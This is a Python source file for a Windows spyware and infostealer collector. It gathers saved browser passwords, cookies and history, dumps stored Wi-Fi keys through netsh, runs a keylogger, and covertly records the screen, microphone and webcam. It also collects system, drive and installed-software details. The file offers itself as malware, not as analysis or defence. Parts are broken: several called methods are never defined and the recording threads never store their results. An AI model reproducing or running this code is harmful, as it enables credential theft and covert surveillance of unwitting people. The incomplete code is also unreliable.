import os
import sys
import json
import sqlite3
import base64
import win32crypt
import shutil
import cv2
import pyautogui
import sounddevice
import browser_cookie3
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import datetime
from pathlib import Path
import psutil
import pythoncom
import win32com.client
import win32api
import win32con
import win32process
from pynput import keyboard
import threading
import wave
import numpy as np
from typing import Dict, List, Optional, Union
import platform
import logging
from concurrent.futures import ThreadPoolExecutor

class BrowserManager:
    def __init__(self):
        self.supported_browsers = {
            'chrome': self._get_chrome_data,
            'firefox': self._get_firefox_data,
            'edge': self._get_edge_data,
            'brave': self._get_brave_data,
            'opera': self._get_opera_data
        }
        
    def collect_all(self) -> Dict[str, Dict]:
        """Collect data from all supported browsers"""
        results = {}
        with ThreadPoolExecutor(max_workers=len(self.supported_browsers)) as executor:
            future_to_browser = {
                executor.submit(func): name 
                for name, func in self.supported_browsers.items()
            }
            for future in future_to_browser:
                name = future_to_browser[future]
                try:
                    results[name] = future.result()
                except Exception as e:
                    results[name] = {'error': str(e)}
        return results
        
    def _get_chrome_data(self) -> Dict:
        """Get Chrome browser data"""
        return {
            'passwords': self._get_chrome_passwords(),
            'cookies': self._get_chrome_cookies(),
            'history': self._get_chrome_history(),
            'bookmarks': self._get_chrome_bookmarks()
        }
        
    def _get_firefox_data(self) -> Dict:
        """Get Firefox browser data"""
        return {
            'passwords': self._get_firefox_passwords(),
            'cookies': self._get_firefox_cookies(),
            'history': self._get_firefox_history(),
            'bookmarks': self._get_firefox_bookmarks()
        }
        
    # Similar methods for other browsers...

class MediaManager:
    def __init__(self):
        self.screen_recorder = None
        self.audio_recorder = None
        self.webcam_recorder = None
        
    def start_screen_recording(self, duration: int = None):
        """Start screen recording"""
        def record():
            frames = []
            start_time = datetime.now()
            while not duration or (datetime.now() - start_time).seconds < duration:
                frame = pyautogui.screenshot()
                frames.append(np.array(frame))
            return frames
            
        self.screen_recorder = threading.Thread(target=record)
        self.screen_recorder.start()
        
    def start_audio_recording(self, duration: int = None):
        """Start audio recording"""
        def record():
            fs = 44100
            channels = 2
            recording = sounddevice.rec(
                int(duration * fs) if duration else None,
                samplerate=fs,
                channels=channels
            )
            return recording
            
        self.audio_recorder = threading.Thread(target=record)
        self.audio_recorder.start()
        
    def start_webcam_recording(self, duration: int = None):
        """Start webcam recording"""
        def record():
            cap = cv2.VideoCapture(0)
            frames = []
            start_time = datetime.now()
            while not duration or (datetime.now() - start_time).seconds < duration:
                ret, frame = cap.read()
                if ret:
                    frames.append(frame)
            cap.release()
            return frames
            
        self.webcam_recorder = threading.Thread(target=record)
        self.webcam_recorder.start()
        
    def stop_all_recordings(self) -> Dict[str, bytes]:
        """Stop all recordings and return the data"""
        results = {}
        
        if self.screen_recorder:
            self.screen_recorder.join()
            results['screen'] = self._save_video(self.screen_recorder.frames)
            
        if self.audio_recorder:
            self.audio_recorder.join()
            results['audio'] = self._save_audio(self.audio_recorder.recording)
            
        if self.webcam_recorder:
            self.webcam_recorder.join()
            results['webcam'] = self._save_video(self.webcam_recorder.frames)
            
        return results
        
    def _save_video(self, frames: List[np.ndarray]) -> bytes:
        """Save frames as video"""
        temp_path = os.path.join(os.getenv('TEMP'), f'vid_{datetime.now().strftime("%Y%m%d_%H%M%S")}.mp4')
        height, width = frames[0].shape[:2]
        
        writer = cv2.VideoWriter(
            temp_path,
            cv2.VideoWriter_fourcc(*'mp4v'),
            30,
            (width, height)
        )
        
        for frame in frames:
            writer.write(frame)
        writer.release()
        
        with open(temp_path, 'rb') as f:
            data = f.read()
        os.remove(temp_path)
        return data
        
    def _save_audio(self, recording: np.ndarray) -> bytes:
        """Save audio recording"""
        temp_path = os.path.join(os.getenv('TEMP'), f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav')
        
        with wave.open(temp_path, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(44100)
            wf.writeframes(recording.tobytes())
            
        with open(temp_path, 'rb') as f:
            data = f.read()
        os.remove(temp_path)
        return data

class SystemInfoCollector:
    def __init__(self):
        self.wmi = None
        try:
            import wmi
            self.wmi = wmi.WMI()
        except:
            pass
            
    def get_detailed_info(self) -> Dict:
        """Get detailed system information"""
        return {
            'system': self._get_system_info(),
            'hardware': self._get_hardware_info(),
            'software': self._get_software_info(),
            'network': self._get_network_info(),
            'security': self._get_security_info()
        }
        
    def _get_system_info(self) -> Dict:
        """Get basic system information"""
        return {
            'os': {
                'name': os.name,
                'platform': sys.platform,
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'architecture': platform.architecture()
            },
            'user': {
                'username': os.getenv('USERNAME'),
                'hostname': platform.node(),
                'domain': os.getenv('USERDOMAIN')
            }
        }
        
    def _get_hardware_info(self) -> Dict:
        """Get hardware information"""
        info = {
            'cpu': {
                'cores': psutil.cpu_count(),
                'usage': psutil.cpu_percent(interval=1, percpu=True)
            },
            'memory': dict(psutil.virtual_memory()._asdict()),
            'disk': {
                drive: dict(psutil.disk_usage(drive)._asdict())
                for drive in self._get_drives()
            }
        }
        
        if self.wmi:
            try:
                info['gpu'] = [{
                    'name': gpu.Name,
                    'driver_version': gpu.DriverVersion
                } for gpu in self.wmi.Win32_VideoController()]
            except:
                pass
                
        return info
        
    def _get_drives(self) -> List[str]:
        """Get all available drives"""
        if os.name == 'nt':
            drives = []
            bitmask = win32api.GetLogicalDrives()
            for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                if bitmask & 1:
                    drives.append(f'{letter}:')
                bitmask >>= 1
            return drives
        return ['/']

class Collector:
    def __init__(self):
        self.browser_manager = BrowserManager()
        self.media_manager = MediaManager()
        self.system_info = SystemInfoCollector()
        self.keylogger_active = False
        self.keystrokes = []
        
    def collect_all(self, include_media: bool = False) -> Dict:
        """Collect all available data"""
        data = {
            'timestamp': datetime.now().isoformat(),
            'system_info': self.system_info.get_detailed_info(),
            'browser_data': self.browser_manager.collect_all(),
            'wifi': self.get_wifi_passwords(),
            'screenshot': self.capture_screen()
        }
        
        if include_media:
            data['media'] = {
                'webcam': self.capture_webcam(),
                'audio': self.capture_audio(duration=5)
            }
            
        return data
        
    def start_monitoring(self, duration: int = None):
        """Start monitoring all available sources"""
        self.start_keylogger()
        self.media_manager.start_screen_recording(duration)
        self.media_manager.start_audio_recording(duration)
        self.media_manager.start_webcam_recording(duration)
        
    def stop_monitoring(self) -> Dict:
        """Stop monitoring and return collected data"""
        return {
            'keystrokes': self.stop_keylogger(),
            'media': self.media_manager.stop_all_recordings()
        }
        
    def get_wifi_passwords(self):
        try:
            pythoncom.CoInitialize()
            passwords = []
            
            # Get wireless interface
            objWMI = win32com.client.Dispatch("WbemScripting.SWbemLocator")
            objSWbemServices = objWMI.ConnectServer(".", "root\\wlan")
            
            # Get profiles
            profiles = objSWbemServices.ExecQuery("SELECT * FROM MSNdis_80211_ServiceSetIdentifier")
            
            for profile in profiles:
                try:
                    ssid = profile.Ssid
                    # Get password using netsh
                    cmd = f'netsh wlan show profile name="{ssid}" key=clear'
                    result = os.popen(cmd).read()
                    
                    if "Key Content" in result:
                        password = result.split("Key Content")[1].split("\n")[0].strip()
                        passwords.append({
                            'ssid': ssid,
                            'password': password
                        })
                except:
                    continue
                    
            return passwords
        except:
            return []
            
    def capture_screen(self):
        try:
            screenshot = ImageGrab.grab()
            temp_path = os.path.join(os.getenv('TEMP'),
                                   f'screen_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            screenshot.save(temp_path)
            
            with open(temp_path, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode()
                
            os.remove(temp_path)
            return image_data
        except:
            return None
            
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                temp_path = os.path.join(os.getenv('TEMP'),
                                       f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
                cv2.imwrite(temp_path, frame)
                
                with open(temp_path, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                    
                os.remove(temp_path)
                return image_data
        except:
            return None
            
    def capture_audio(self, duration: int = None):
        try:
            fs = 44100
            channels = 2
            recording = sounddevice.rec(
                int(duration * fs) if duration else None,
                samplerate=fs,
                channels=channels
            )
            return self.media_manager._save_audio(recording)
        except:
            return None
            
    def start_keylogger(self):
        if not self.keylogger_active:
            self.keylogger_active = True
            
            def on_press(key):
                if self.keylogger_active:
                    try:
                        self.keystrokes.append(str(key.char))
                    except AttributeError:
                        self.keystrokes.append(str(key))
                        
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            
    def stop_keylogger(self):
        self.keylogger_active = False
        if hasattr(self, 'listener'):
            self.listener.stop()
        keystrokes = ''.join(self.keystrokes)
        self.keystrokes = []
        return keystrokes
        
    def get_system_info(self):
        info = {
            'os': os.name,
            'platform': sys.platform,
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME'),
            'memory': dict(psutil.virtual_memory()._asdict()),
            'disk': dict(psutil.disk_usage('/')._asdict()),
            'network': [dict(nic._asdict()) for nic in psutil.net_if_addrs().values()],
            'processes': [p.name() for p in psutil.process_iter()]
        }
        return info
        
    def get_browser_cookies(self):
        cookies = {}
        try:
            cookies['chrome'] = list(browser_cookie3.chrome())
        except:
            pass
            
        try:
            cookies['firefox'] = list(browser_cookie3.firefox())
        except:
            pass
            
        return cookies
        
    def get_installed_software(self):
        try:
            pythoncom.CoInitialize()
            software_list = []
            
            # Windows Registry paths
            paths = [
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            ]
            
            for path in paths:
                try:
                    aReg = win32api.RegConnectRegistry(None, win32con.HKEY_LOCAL_MACHINE)
                    aKey = win32api.RegOpenKey(aReg, path, 0, win32con.KEY_READ)
                    
                    for i in range(win32api.RegQueryInfoKey(aKey)[0]):
                        try:
                            keyname = win32api.RegEnumKey(aKey, i)
                            subkey = win32api.RegOpenKey(aKey, keyname)
                            displayName = win32api.RegQueryValueEx(subkey, "DisplayName")[0]
                            
                            software_list.append({
                                'name': displayName,
                                'version': win32api.RegQueryValueEx(subkey, "DisplayVersion")[0],
                                'publisher': win32api.RegQueryValueEx(subkey, "Publisher")[0],
                                'install_date': win32api.RegQueryValueEx(subkey, "InstallDate")[0]
                            })
                        except:
                            continue
                except:
                    continue
                    
            return software_list
        except:
            return []
